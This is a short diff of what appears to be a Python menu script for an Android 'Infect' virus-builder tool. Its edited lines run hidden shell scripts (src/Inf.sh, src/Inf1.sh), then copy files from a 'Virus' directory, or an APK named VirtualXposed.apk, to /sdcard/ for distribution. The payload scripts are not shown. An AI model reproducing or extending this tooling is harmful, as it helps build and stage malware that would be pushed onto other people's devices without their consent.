@@ -15,10 +15,10 @@ op=int(raw_input("1nfEct: "))
 
 if(op==1):
  os.system("clear")
- os.system("cd && cd Infect && bash src/Inf.sh && cp * /sdcard/")
+ os.system("cd && cd Infect && bash src/Inf.sh && cd Virus && cp * /sdcard/")
 elif(op==2):
  os.system("clear")
- os.system("cd && cd Infect && bash src/Inf1.sh && cp * /sdcard/")
+ os.system("cd && cd Infect && bash src/Inf1.sh && cd Virus && cp VirtualXposed.apk /sdcard/")
 elif(op==3):
  time.sleep(0.2)
  print("\033[1;31;40mQuiting utility...")
